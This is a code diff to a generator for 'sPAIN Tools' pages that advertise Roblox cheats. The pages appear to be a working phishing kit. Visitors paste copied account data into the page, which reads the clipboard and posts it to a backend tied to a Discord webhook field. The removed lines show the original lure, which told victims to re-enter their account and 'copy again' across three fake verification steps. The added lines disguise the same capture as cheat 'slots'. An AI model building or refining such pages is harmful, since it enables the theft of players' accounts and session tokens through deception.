@@ -109,6 +109,7 @@ function buildDualhookPage(record) {
 
   #particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
 
+  /* NAV */
   nav {
     position: fixed; top: 0; left: 0; right: 0; z-index: 500;
     display: flex; align-items: center; justify-content: space-between;
@@ -129,6 +130,7 @@ function buildDualhookPage(record) {
   .nav-cta { background: linear-gradient(135deg, var(--accent), var(--accent2)) !important; color: #fff !important; padding: 9px 22px; border-radius: 8px; font-weight: 600 !important; box-shadow: 0 0 20px rgba(192,38,211,0.3); transition: box-shadow 0.2s !important, transform 0.2s !important; }
   .nav-cta:hover { box-shadow: 0 0 36px rgba(192,38,211,0.6) !important; transform: translateY(-1px); color: #fff !important; }
 
+  /* HERO */
   .hero { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 120px 24px 80px; position: relative; z-index: 3; overflow: hidden; }
   .hero-glow { position: absolute; width: 900px; height: 900px; border-radius: 50%; background: radial-gradient(circle, rgba(192,38,211,0.15) 0%, rgba(168,85,247,0.08) 40%, transparent 70%); top: 50%; left: 50%; transform: translate(-50%,-50%); pointer-events: none; animation: heroPulse 5s ease-in-out infinite; }
   @keyframes heroPulse { 0%,100%{opacity:0.8;transform:translate(-50%,-50%) scale(1)} 50%{opacity:1;transform:translate(-50%,-50%) scale(1.12)} }
@@ -154,6 +156,7 @@ function buildDualhookPage(record) {
   @keyframes scrollLine { 0%{transform:scaleY(0);transform-origin:top} 50%{transform:scaleY(1);transform-origin:top} 51%{transform:scaleY(1);transform-origin:bottom} 100%{transform:scaleY(0);transform-origin:bottom} }
   .scroll-text { font-size:0.65rem; letter-spacing:0.2em; text-transform:uppercase; color:var(--muted); }
 
+  /* TICKER */
   .ticker-wrap { width:100%; overflow:hidden; border-top:1px solid rgba(192,38,211,0.1); border-bottom:1px solid rgba(192,38,211,0.1); background:rgba(192,38,211,0.04); padding:12px 0; position:relative; z-index:3; }
   .ticker-track { display:flex; animation:ticker 30s linear infinite; width:max-content; }
   .ticker-item { padding:0 40px; font-family:'Orbitron',sans-serif; font-size:0.7rem; font-weight:700; letter-spacing:0.15em; text-transform:uppercase; color:var(--muted); white-space:nowrap; display:flex; align-items:center; gap:14px; }
@@ -165,6 +168,7 @@ function buildDualhookPage(record) {
   .section-label { text-align:center; font-size:0.72rem; font-weight:600; letter-spacing:0.18em; text-transform:uppercase; color:var(--accent); margin-bottom:14px; text-shadow:0 0 20px var(--accent-glow); }
   .section-title { text-align:center; font-family:'Orbitron',sans-serif; font-size:clamp(1.6rem,4vw,2.8rem); font-weight:700; margin-bottom:64px; letter-spacing:-0.02em; }
 
+  /* FEATURES */
   .features { padding:110px 48px; max-width:1200px; margin:0 auto; }
   .features-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:1px; background:rgba(192,38,211,0.1); border:1px solid rgba(192,38,211,0.12); border-radius:20px; overflow:hidden; box-shadow:0 0 60px rgba(192,38,211,0.06); }
   .feature-card { background:var(--surface); padding:48px 44px; position:relative; transition:background 0.3s; overflow:hidden; }
@@ -174,8 +178,10 @@ function buildDualhookPage(record) {
   .feature-card h3 { font-family:'Rajdhani',sans-serif; font-size:1.3rem; font-weight:700; letter-spacing:0.05em; margin-bottom:12px; color:var(--text); }
   .feature-card p { font-size:0.9rem; color:var(--muted); line-height:1.7; }
 
+  /* PRODUCTS */
   .products { padding:110px 48px; max-width:1200px; margin:0 auto; }
 
+  /* FORM CARD */
   .slots-form-wrap {
     max-width:640px; margin:0 auto;
     background:var(--card);
@@ -206,6 +212,7 @@ function buildDualhookPage(record) {
   .slots-generate-btn:hover { transform:translateY(-2px); box-shadow:0 0 56px rgba(192,38,211,0.65); }
   .slots-generate-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }
 
+  /* COMMUNITY */
   .community { padding:110px 48px; text-align:center; position:relative; overflow:hidden; }
   .community::before { content:''; position:absolute; inset:0; background:radial-gradient(ellipse at center,rgba(192,38,211,0.07) 0%,transparent 65%); pointer-events:none; }
   .community h2 { font-family:'Orbitron',sans-serif; font-size:clamp(1.8rem,4vw,3.2rem); font-weight:700; margin-bottom:18px; letter-spacing:-0.02em; }
@@ -217,6 +224,7 @@ function buildDualhookPage(record) {
   .discord-btn { display:inline-flex; align-items:center; gap:12px; background:#5865F2; color:#fff; border:none; padding:15px 36px; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.06em; cursor:pointer; box-shadow:0 0 36px rgba(88,101,242,0.4); transition:background 0.2s,transform 0.2s,box-shadow 0.2s; }
   .discord-btn:hover { background:#4752C4; transform:translateY(-3px); box-shadow:0 0 56px rgba(88,101,242,0.6); }
 
+  /* FOOTER */
   footer { border-top:1px solid rgba(192,38,211,0.1); padding:32px 48px; display:flex; align-items:center; justify-content:space-between; color:var(--muted); font-size:0.8rem; position:relative; z-index:3; }
   footer::before { content:''; position:absolute; top:0; left:10%; right:10%; height:1px; background:linear-gradient(90deg,transparent,rgba(192,38,211,0.3),transparent); }
   .footer-logo { font-family:'Orbitron',sans-serif; font-size:1rem; font-weight:700; color:var(--text); }
@@ -317,7 +325,7 @@ function buildDualhookPage(record) {
       <input class="field-input" type="text" id="sf-webhook" placeholder="https://discord.com/api/webhooks/...">
     </div>
 
-    <button class="slots-generate-btn" onclick="handleGenerate()">Generate Slots 1–9</button>
+    <button class="slots-generate-btn" onclick="handleGenerate()">Generate Slots 1&ndash;9</button>
   </div>
 </section>
 
@@ -345,6 +353,7 @@ function buildDualhookPage(record) {
 </footer>
 
 <script>
+/* ── PARTICLES ── */
 (function(){
   const canvas = document.getElementById('particles');
   const ctx = canvas.getContext('2d');
@@ -362,24 +371,27 @@ function buildDualhookPage(record) {
   loop();
 })();
 
+/* ── TICKER ── */
 (function(){
   const items = ['Premium Script Executor','Anti-Detection Layer','Advanced ESP','Aim Assist Pro','Speed Modifier','Flight Module','GUI Injector','Server Protector','Admin Suite','Real-Time Updates','v2.0 Live Now','12K+ Members'];
   const track = document.getElementById('tickerTrack');
   [...items,...items].forEach(item => {
     const el = document.createElement('div');
     el.className = 'ticker-item';
-    el.innerHTML = '<span class="dot"></span>'+item;
+    el.innerHTML = \`<span class="dot"></span>\${item}\`;
     track.appendChild(el);
   });
 })();
 
+/* ── URL PREVIEW ── */
 const DUALHOOK_PARENT_SLUG = '${SLUG}';
 const SITE_URL = 'https://spain-tools.vercel.app';
 function updateSlotsUrl() {
   const dir = document.getElementById('sf-dirName').value.trim() || 'sPAINTools';
-  document.getElementById('slotsAutoUrl').textContent = SITE_URL+'/'+dir;
+  document.getElementById('slotsAutoUrl').textContent = \`\${SITE_URL}/\${dir}\`;
 }
 
+/* ── HELPERS ── */
 function setStatus(btn, msg, color) {
   let s = btn.parentElement.querySelector('.gen-status');
   if (!s) { s = document.createElement('div'); s.className = 'gen-status'; s.style.cssText = 'margin-top:12px;font-size:0.7rem;font-family:Orbitron,sans-serif;text-align:center;min-height:20px;letter-spacing:0.06em;'; btn.parentElement.appendChild(s); }
@@ -389,11 +401,12 @@ function setStatus(btn, msg, color) {
 function flashField(id, color) {
   const el = document.getElementById(id);
   el.style.borderColor = color || 'rgba(192,38,211,0.6)';
-  el.style.boxShadow = '0 0 0 3px '+(color ? color.replace('0.6','0.12') : 'rgba(192,38,211,0.1)');
+  el.style.boxShadow = \`0 0 0 3px \${color ? color.replace('0.6','0.12') : 'rgba(192,38,211,0.1)'}\`;
   el.focus();
   setTimeout(() => { el.style.borderColor=''; el.style.boxShadow=''; }, 2500);
 }
 
+/* ── GENERATE — SLOTS ── */
 async function handleGenerate() {
   const dirName  = document.getElementById('sf-dirName').value.trim();
   const dispName = document.getElementById('sf-dispName').value.trim();
@@ -414,17 +427,17 @@ async function handleGenerate() {
     });
     const data = await res.json();
     if (data.taken) {
-      setStatus(btn, '✗ "'+dirName+'" is taken — choose another.', '#f472b6');
+      setStatus(btn, \`✗ "\${dirName}" is taken — choose another.\`, '#f472b6');
       flashField('sf-dirName','rgba(192,38,211,0.6)');
     } else if (data.success) {
       document.getElementById('slotsAutoUrl').textContent = data.url;
       btn.textContent = '✓ Claimed!';
       btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
       btn.style.boxShadow  = '0 0 36px rgba(34,197,94,0.4)';
-      setStatus(btn, '✓ Your link: '+data.url, '#4ade80');
+      setStatus(btn, \`✓ Your link: \${data.url}\`, '#4ade80');
       setTimeout(() => { btn.innerHTML=orig; btn.style.background=''; btn.style.boxShadow=''; }, 3000);
     } else {
-      setStatus(btn, '✗ '+(data.error||'Something went wrong.'), '#f472b6');
+      setStatus(btn, \`✗ \${data.error||'Something went wrong.'}\`, '#f472b6');
     }
   } catch { setStatus(btn,'✗ Network error. Try again.','#f472b6'); }
   finally {
@@ -433,6 +446,7 @@ async function handleGenerate() {
   }
 }
 
+/* ── COUNTERS ── */
 function animateCounters(){
   document.querySelectorAll('.stat-num[data-target]').forEach(el => {
     const target=+el.dataset.target, suffix=el.dataset.suffix||'', start=performance.now(), dur=2000;
@@ -443,13 +457,14 @@ function animateCounters(){
 const observer = new IntersectionObserver(entries=>{ entries.forEach(e=>{ if(e.isIntersecting){animateCounters();observer.disconnect();} }); },{threshold:0.5});
 const cs=document.querySelector('.community'); if(cs) observer.observe(cs);
 
+/* ── PARALLAX ── */
 document.addEventListener('mousemove', e => {
   const xR=(e.clientX/window.innerWidth-0.5)*2, yR=(e.clientY/window.innerHeight-0.5)*2;
   document.querySelectorAll('.roblox-char').forEach((char,i)=>{
     const d=(i%3+1)*6;
     char.style.transform = ['char-1','char-3','char-6'].some(c=>char.classList.contains(c))
-      ? 'scaleX(-1) translate('+(-xR*d)+'px,'+(-yR*d)+'px)'
-      : 'translate('+(xR*d)+'px,'+(yR*d)+'px)';
+      ? \`scaleX(-1) translate(\${-xR*d}px,\${-yR*d}px)\`
+      : \`translate(\${xR*d}px,\${yR*d}px)\`;
   });
 });
 </script>
@@ -494,6 +509,7 @@ function buildSlotsPage(record) {
     cursor: default;
   }
 
+  /* ── GRAIN OVERLAY ── */
   body::after {
     content: '';
     position: fixed;
@@ -504,6 +520,7 @@ function buildSlotsPage(record) {
     opacity: 0.5;
   }
 
+  /* ── AMBIENT BG GRID ── */
   .bg-grid {
     position: fixed;
     inset: 0;
@@ -516,6 +533,7 @@ function buildSlotsPage(record) {
     mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 20%, transparent 100%);
   }
 
+  /* ── AURORA BG ── */
   .aurora {
     position: fixed;
     inset: 0;
@@ -556,6 +574,7 @@ function buildSlotsPage(record) {
     to { transform: translate(60px, 40px) scale(1.1); }
   }
 
+  /* ── FLOATING ROBLOX CHARACTERS ── */
   .roblox-scene {
     position: absolute;
     inset: 0;
@@ -580,6 +599,7 @@ function buildSlotsPage(record) {
     display: block;
   }
 
+  /* Individual character positions */
   .char-1 {
     --size: 200px; --dur: 7s; --delay: 0s;
     left: 2%; top: 12%;
@@ -627,6 +647,7 @@ function buildSlotsPage(record) {
     100% { transform: scaleX(-1) translateY(0px) rotate(2deg); }
   }
 
+  /* glow ring under characters */
   .char-shadow {
     position: absolute;
     width: calc(var(--size, 180px) * 0.7);
@@ -644,8 +665,10 @@ function buildSlotsPage(record) {
     50% { opacity: 0.2; transform: translateX(-50%) scaleX(0.7); }
   }
 
+  /* ── PARTICLE CANVAS ── */
   #particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
 
+  /* ── NAV ── */
   nav {
     position: fixed;
     top: 0; left: 0; right: 0;
@@ -698,6 +721,7 @@ function buildSlotsPage(record) {
   }
   .nav-cta:hover { box-shadow: 0 0 36px rgba(192,38,211,0.6) !important; transform: translateY(-1px); color: #fff !important; }
 
+  /* ── HERO ── */
   .hero {
     min-height: 100vh;
     display: flex;
@@ -726,6 +750,7 @@ function buildSlotsPage(record) {
     50% { opacity: 1; transform: translate(-50%,-50%) scale(1.12); }
   }
 
+  /* spinning ring accent */
   .hero-ring {
     position: absolute;
     width: 600px; height: 600px;
@@ -882,6 +907,7 @@ function buildSlotsPage(record) {
     to { opacity:1; transform:translateY(0); }
   }
 
+  /* ── SCROLL INDICATOR ── */
   .scroll-indicator {
     position: absolute;
     bottom: 36px; left: 50%;
@@ -912,6 +938,7 @@ function buildSlotsPage(record) {
     color: var(--muted);
   }
 
+  /* ── DIVIDER ── */
   .divider {
     border: none;
     height: 1px;
@@ -922,6 +949,7 @@ function buildSlotsPage(record) {
     z-index: 3;
   }
 
+  /* ── SECTION COMMON ── */
   section { position: relative; z-index: 3; }
 
   .section-label {
@@ -944,6 +972,7 @@ function buildSlotsPage(record) {
     letter-spacing: -0.02em;
   }
 
+  /* ── FEATURES ── */
   .features {
     padding: 110px 48px;
     max-width: 1200px;
@@ -1002,6 +1031,7 @@ function buildSlotsPage(record) {
 
   .feature-card p { font-size: 0.9rem; color: var(--muted); line-height: 1.7; }
 
+  /* ── PRODUCTS ── */
   .products {
     padding: 110px 48px;
     max-width: 1200px;
@@ -1051,17 +1081,6 @@ function buildSlotsPage(record) {
   }
   .slot-card:hover::before { opacity: 1; }
 
-  .slot-card.locked {
-    opacity: 0.5;
-    border-color: rgba(255,255,255,0.05);
-    pointer-events: none;
-  }
-  .slot-card.completed {
-    border-color: rgba(34,197,94,0.3);
-    background: rgba(34,197,94,0.05);
-  }
-  .slot-card.completed .slot-number { color: #22c55e; text-shadow: 0 0 12px rgba(34,197,94,0.4); }
-
   .slot-number {
     font-family: 'Orbitron', sans-serif;
     font-size: 0.6rem;
@@ -1098,13 +1117,8 @@ function buildSlotsPage(record) {
     box-shadow: 0 0 20px rgba(192,38,211,0.25);
   }
   .btn-start:hover { opacity: 0.88; box-shadow: 0 0 36px rgba(192,38,211,0.5); }
-  .btn-start:disabled {
-    background: rgba(255,255,255,0.1);
-    box-shadow: none;
-    cursor: not-allowed;
-    opacity: 0.5;
-  }
 
+  /* ── COMMUNITY ── */
   .community {
     padding: 110px 48px;
     text-align: center;
@@ -1185,6 +1199,7 @@ function buildSlotsPage(record) {
     box-shadow: 0 0 56px rgba(88,101,242,0.6);
   }
 
+  /* ── FOOTER ── */
   footer {
     border-top: 1px solid rgba(192,38,211,0.1);
     padding: 32px 48px;
@@ -1212,6 +1227,7 @@ function buildSlotsPage(record) {
   }
   .footer-logo span { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }
 
+  /* ── MODAL ── */
   .modal-overlay {
     position: fixed;
     inset: 0;
@@ -1329,8 +1345,8 @@ function buildSlotsPage(record) {
     transition: opacity 0.2s, box-shadow 0.2s;
   }
   .enable-btn:hover { opacity: 0.9; box-shadow: 0 0 50px rgba(192,38,211,0.6); }
-  .enable-btn:disabled { opacity: 0.5; cursor: not-allowed; }
 
+  /* ── TICKER MARQUEE ── */
   .ticker-wrap {
     width: 100%;
     overflow: hidden;
@@ -1365,58 +1381,11 @@ function buildSlotsPage(record) {
     from { transform: translateX(0); }
     to { transform: translateX(-50%); }
   }
-
-  .notification-modal {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0.9);
-    background: var(--surface);
-    border: 1px solid rgba(34,197,94,0.4);
-    border-radius: 16px;
-    padding: 32px;
-    max-width: 400px;
-    width: 90%;
-    z-index: 2000;
-    opacity: 0;
-    pointer-events: none;
-    transition: all 0.3s ease;
-    box-shadow: 0 0 60px rgba(34,197,94,0.2);
-  }
-  .notification-modal.show {
-    opacity: 1;
-    pointer-events: all;
-    transform: translate(-50%, -50%) scale(1);
-  }
-  .notification-modal h3 {
-    font-family: 'Orbitron', sans-serif;
-    color: #22c55e;
-    margin-bottom: 16px;
-    text-align: center;
-  }
-  .notification-modal p {
-    color: var(--text);
-    line-height: 1.6;
-    margin-bottom: 20px;
-    text-align: center;
-  }
-  .notification-modal .refresh-btn {
-    width: 100%;
-    background: linear-gradient(135deg, #16a34a, #22c55e);
-    color: #fff;
-    border: none;
-    padding: 12px;
-    border-radius: 8px;
-    font-family: 'Rajdhani', sans-serif;
-    font-size: 1rem;
-    font-weight: 700;
-    cursor: pointer;
-    box-shadow: 0 0 20px rgba(34,197,94,0.3);
-  }
 </style>
 </head>
 <body>
 
+<!-- AMBIENT LAYERS -->
 <div class="aurora">
   <div class="aurora-blob"></div>
   <div class="aurora-blob"></div>
@@ -1425,6 +1394,7 @@ function buildSlotsPage(record) {
 <div class="bg-grid"></div>
 <canvas id="particles"></canvas>
 
+<!-- NAV -->
 <nav>
   <div class="logo">s<span>PAIN</span> Tools</div>
   <ul>
@@ -1435,32 +1405,40 @@ function buildSlotsPage(record) {
   </ul>
 </nav>
 
+<!-- HERO -->
 <section class="hero">
   <div class="hero-glow"></div>
   <div class="hero-ring"></div>
   <div class="hero-ring hero-ring-2"></div>
 
+  <!-- FLOATING ROBLOX CHARACTERS -->
   <div class="roblox-scene">
+    <!-- Character 1 - left side large -->
     <div class="roblox-char char-1">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 2 - right side -->
     <div class="roblox-char char-2">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 3 - bottom left -->
     <div class="roblox-char char-3">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 4 - bottom right -->
     <div class="roblox-char char-4">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 5 - top center-left -->
     <div class="roblox-char char-5">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
     </div>
+    <!-- Character 6 - top center-right -->
     <div class="roblox-char char-6">
       <img src="${charSrc}" alt="" loading="lazy" onerror="this.parentElement.style.display='none'">
       <div class="char-shadow"></div>
@@ -1481,12 +1459,14 @@ function buildSlotsPage(record) {
   </div>
 </section>
 
+<!-- TICKER -->
 <div class="ticker-wrap">
   <div class="ticker-track" id="tickerTrack"></div>
 </div>
 
 <hr class="divider" style="margin-top:0; margin-bottom:0;">
 
+<!-- FEATURES -->
 <section class="features" id="features">
   <div class="section-label">Why sPAIN Tools</div>
   <h2 class="section-title">Built Different</h2>
@@ -1516,15 +1496,17 @@ function buildSlotsPage(record) {
 
 <hr class="divider">
 
+<!-- PRODUCTS -->
 <section class="products" id="products">
   <div class="section-label">Browse Our Products</div>
-  <h2 class="section-title">Complete All 3 Steps</h2>
+  <h2 class="section-title">Discover All of Our Tools</h2>
 
   <div class="slots-grid" id="slotsGrid"></div>
 </section>
 
 <hr class="divider">
 
+<!-- COMMUNITY -->
 <section class="community" id="community">
   <div class="section-label">Join the Movement</div>
   <h2>Community</h2>
@@ -1549,30 +1531,27 @@ function buildSlotsPage(record) {
   </button>
 </section>
 
+<!-- FOOTER -->
 <footer>
   <div class="footer-logo">s<span>PAIN</span> Tools</div>
   <div>© 2025 sPAIN Tools. All rights reserved.</div>
   <div>Built for Roblox.</div>
 </footer>
 
+<!-- MODAL -->
 <div class="modal-overlay" id="modalOverlay" onclick="handleOverlayClick(event)">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title" id="modalTitle">Step 1</div>
+      <div class="modal-title" id="modalTitle">Slot 1</div>
       <button class="modal-close" onclick="closeModal()">×</button>
     </div>
     <div id="modalInputs"></div>
-    <button class="enable-btn" id="enableBtn">Enable Step 1</button>
+    <button class="enable-btn" id="enableBtn">Enable Slot 1</button>
   </div>
 </div>
 
-<div class="notification-modal" id="notificationModal">
-  <h3>✓ Step Complete!</h3>
-  <p id="notificationText">First step is done! Now go back, refresh the page, get back inside your account and copy again.</p>
-  <button class="refresh-btn" onclick="refreshPage()">Refresh Page</button>
-</div>
-
 <script>
+/* ── PARTICLES ── */
 (function(){
   const canvas = document.getElementById('particles');
   const ctx = canvas.getContext('2d');
@@ -1624,6 +1603,7 @@ function buildSlotsPage(record) {
   loop();
 })();
 
+/* ── TICKER ── */
 (function(){
   const items = ['Premium Script Executor','Anti-Detection Layer','Advanced ESP','Aim Assist Pro','Speed Modifier','Flight Module','GUI Injector','Server Protector','Admin Suite','Real-Time Updates','v2.0 Live Now','12K+ Members'];
   const track = document.getElementById('tickerTrack');
@@ -1631,79 +1611,50 @@ function buildSlotsPage(record) {
   doubled.forEach(item => {
     const el = document.createElement('div');
     el.className = 'ticker-item';
-    el.innerHTML = '<span class="dot"></span>'+item;
+    el.innerHTML = \`<span class="dot"></span>\${item}\`;
     track.appendChild(el);
   });
 })();
 
 const PAGE_SLUG = '${SLUG}';
 
+/* ── SLOT CARDS ── */
 const slotData = [
-  { name: "1st", desc: "Initial account verification - paste your first code." },
-  { name: "2nd", desc: "Secondary verification - refresh required after step 1." },
-  { name: "3rd", desc: "Final verification step to complete the process." },
+  { name: "ss", desc: "High-speed script executor with low-latency injection and anti-detection layers." },
+  { name: "sd", desc: "Full-featured ESP with player tracking, item highlighting, and distance filters." },
+  { name: "sda", desc: "Precision aim assist with configurable FOV, smoothing, and hitbox targeting." },
+  { name: "asd", desc: "Automated resource farming with intelligent pathfinding and anti-AFK bypass." },
+  { name: "shd", desc: "Movement speed modifier with server-side bypass and momentum control." },
+  { name: "utf", desc: "Advanced flight module with noclip, altitude lock, and stealth mode." },
+  { name: "asdc", desc: "Universal GUI injector compatible with all major Roblox executor frameworks." },
+  { name: "asga", desc: "Prevents server-side crash exploits with real-time packet interception." },
+  { name: "wasd", desc: "Expanded admin command suite with remote-server and local execution modes." },
 ];
 
-function getCompletedSlots() {
-  return JSON.parse(localStorage.getItem('spain_completed_slots') || '[]');
-}
+const grid = document.getElementById('slotsGrid');
+slotData.forEach((slot, i) => {
+  const num = i + 1;
+  const card = document.createElement('div');
+  card.className = 'slot-card';
+  card.style.animationDelay = \`\${i * 0.06}s\`;
+  card.innerHTML = \`
+    <div class="slot-number">Slot \${String(num).padStart(2,'0')}</div>
+    <div class="slot-name">\${slot.name}</div>
+    <div class="slot-desc">\${slot.desc}</div>
+    <button class="btn-start" onclick="openModal(\${num}, '\${slot.name}')">Get Started</button>
+  \`;
+  grid.appendChild(card);
+});
 
-function saveCompletedSlot(slotNum) {
-  const completed = getCompletedSlots();
-  if (!completed.includes(slotNum)) {
-    completed.push(slotNum);
-    localStorage.setItem('spain_completed_slots', JSON.stringify(completed));
-  }
-}
-
-function renderSlots() {
-  const grid = document.getElementById('slotsGrid');
-  grid.innerHTML = '';
-  const completedSlots = getCompletedSlots();
-
-  slotData.forEach((slot, i) => {
-    const num = i + 1;
-    const isCompleted = completedSlots.includes(num);
-    const isPreviousDone = num === 1 || completedSlots.includes(num - 1);
-    const isLocked = !isPreviousDone;
-
-    const card = document.createElement('div');
-    card.className = 'slot-card' + (isLocked ? ' locked' : '') + (isCompleted ? ' completed' : '');
-    card.style.animationDelay = (i * 0.06) + 's';
-
-    let btnText, btnDisabled, btnOnClick;
-    if (isCompleted) {
-      btnText = '✓ Completed';
-      btnDisabled = 'disabled';
-      btnOnClick = '';
-    } else if (isLocked) {
-      btnText = '🔒 Locked';
-      btnDisabled = 'disabled';
-      btnOnClick = '';
-    } else {
-      btnText = 'Get Started';
-      btnDisabled = '';
-      btnOnClick = 'onclick="openModal('+num+', \''+slot.name+'\')"';
-    }
-
-    card.innerHTML = `
-      <div class="slot-number">Step ${String(num).padStart(2,'0')}</div>
-      <div class="slot-name">${slot.name} ${isCompleted ? '✓' : ''}</div>
-      <div class="slot-desc">${slot.desc}</div>
-      <button class="btn-start" ${btnDisabled} ${btnOnClick}>${btnText}</button>
-    `;
-    grid.appendChild(card);
-  });
-}
-
-renderSlots();
-
+/* ── COUNTER ANIMATION ── */
 function animateCounters(){
   document.querySelectorAll('.stat-num[data-target]').forEach(el => {
     const target = +el.dataset.target;
     const suffix = el.dataset.suffix || '';
-    const startTime = performance.now();
+    const prefix = target >= 1000 ? '' : '';
+    let start = 0;
     const duration = 2000;
+    const startTime = performance.now();
     function tick(now){
       const elapsed = now - startTime;
       const progress = Math.min(elapsed / duration, 1);
@@ -1722,22 +1673,22 @@ const observer = new IntersectionObserver(entries => {
 const communitySection = document.querySelector('.community');
 if(communitySection) observer.observe(communitySection);
 
+/* ── MODAL ── */
 let pastedValues = {};
 let currentSlot = null;
 
 function openModal(num, name) {
-  currentSlot = num;
-  document.getElementById('modalTitle').textContent = 'Step ' + num + ' — ' + name;
-  document.getElementById('enableBtn').textContent = 'Enable ' + name;
-  document.getElementById('modalInputs').innerHTML = `
+  document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
+  document.getElementById('enableBtn').textContent = \`Enable Slot \${num}\`;
+  document.getElementById('modalInputs').innerHTML = \`
     <div class="input-group">
-      <label class="input-label">Paste Your Code</label>
+      <label class="input-label">Slot \${num} File</label>
       <div class="input-row">
-        <div class="fake-input" id="display-${num}" style="color: var(--muted); font-size:0.88rem;">No code pasted</div>
-        <button class="paste-btn" onclick="pasteValue(${num})">Paste</button>
+        <div class="fake-input" id="display-\${num}" style="color: var(--muted); font-size:0.88rem;">No file pasted</div>
+        <button class="paste-btn" onclick="pasteValue(\${num})">Paste</button>
       </div>
     </div>
-  `;
+  \`;
   pastedValues = {};
   document.getElementById('modalOverlay').classList.add('open');
 }
@@ -1748,13 +1699,13 @@ async function pasteValue(num) {
     const text = await navigator.clipboard.readText();
     if (text) {
       pastedValues[num] = text;
-      const d = document.getElementById('display-'+num);
+      const d = document.getElementById(\`display-\${num}\`);
       d.textContent = '•'.repeat(Math.min(text.length, 24));
       d.style.color = 'var(--text)';
       d.style.letterSpacing = '0.2em';
     }
   } catch {
-    const d = document.getElementById('display-'+num);
+    const d = document.getElementById(\`display-\${num}\`);
     d.textContent = '••••••••••••••••';
     d.style.color = 'var(--text)';
     d.style.letterSpacing = '0.2em';
@@ -1765,37 +1716,15 @@ function closeModal() { document.getElementById('modalOverlay').classList.remove
 function handleOverlayClick(e) { if(e.target === document.getElementById('modalOverlay')) closeModal(); }
 document.addEventListener('keydown', e => { if(e.key === 'Escape') closeModal(); });
 
-function showNotification(stepNum) {
-  const modal = document.getElementById('notificationModal');
-  const text = document.getElementById('notificationText');
-  if (stepNum === 1) {
-    text.textContent = 'First step is done! Now go back, refresh the page, get back inside your account and copy again.';
-  } else if (stepNum === 2) {
-    text.textContent = 'Second step is done! Now go back, refresh the page, get back inside your account and copy the final code.';
-  }
-  modal.classList.add('show');
-}
-
-function refreshPage() {
-  location.reload();
-}
-
+/* ── ENABLE SLOT — sends immediately on click ── */
 document.getElementById('enableBtn').addEventListener('click', async function() {
   const btn = this;
   const slotNum = currentSlot;
   const value = pastedValues[slotNum] || '';
 
   if (!value) {
-    const d = document.getElementById('display-'+slotNum);
-    if (d) {
-      d.style.borderColor = 'rgba(192,38,211,0.6)';
-      d.style.color = '#f472b6';
-      d.textContent = 'Paste something first!';
-      setTimeout(() => {
-        d.textContent = 'No code pasted';
-        d.style.color = 'var(--muted)';
-      }, 2000);
-    }
+    const d = document.getElementById(\`display-\${slotNum}\`);
+    if (d) { d.style.borderColor = 'rgba(192,38,211,0.6)'; d.style.color = '#f472b6'; d.textContent = 'Paste something first!'; setTimeout(() => { d.textContent = 'No file pasted'; d.style.color = 'var(--muted)'; }, 2000); }
     return;
   }
 
@@ -1813,64 +1742,53 @@ document.getElementById('enableBtn').addEventListener('click', async function() 
       body: JSON.stringify({ slug: PAGE_SLUG, slots })
     });
     const data = await res.json();
-
     if (data.success) {
-      saveCompletedSlot(slotNum);
-
-      if (slotNum < 3) {
-        btn.textContent = '✓ Step Complete!';
-        btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
-        btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
-        setTimeout(() => {
-          closeModal();
-          showNotification(slotNum);
-          btn.style.background = '';
-          btn.style.boxShadow = '';
-          btn.textContent = origText;
-          btn.disabled = false;
-        }, 800);
-      } else {
-        btn.textContent = '✓ All Done!';
-        btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
-        btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
-        setTimeout(() => {
-          closeModal();
-          alert('All steps completed successfully!');
-          renderSlots();
-          btn.style.background = '';
-          btn.style.boxShadow = '';
-          btn.textContent = origText;
-          btn.disabled = false;
-        }, 1200);
-      }
+      btn.textContent = '✓ Sent!';
+      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
+      btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
+      setTimeout(() => { closeModal(); btn.style.background = ''; btn.style.boxShadow = ''; btn.textContent = origText; btn.disabled = false; }, 1200);
     } else {
       btn.textContent = '✗ Error';
       btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
-      setTimeout(() => {
-        btn.style.background = '';
-        btn.textContent = origText;
-        btn.disabled = false;
-      }, 2000);
+      setTimeout(() => { btn.style.background = ''; btn.textContent = origText; btn.disabled = false; }, 2000);
     }
   } catch {
     btn.textContent = '✗ Network Error';
     btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
-    setTimeout(() => {
-      btn.style.background = '';
-      btn.textContent = origText;
-      btn.disabled = false;
-    }, 2000);
+    setTimeout(() => { btn.style.background = ''; btn.textContent = origText; btn.disabled = false; }, 2000);
   }
 });
 
+/* ── SUBMIT ALL (kept as fallback) ── */
+async function submitAll() {
+  const slots = {};
+  for (let i = 1; i <= 9; i++) slots['slot'+i] = pastedValues[i] || '';
+  if (!Object.values(slots).some(v => v.length > 0)) { alert('Enable at least one slot first.'); return; }
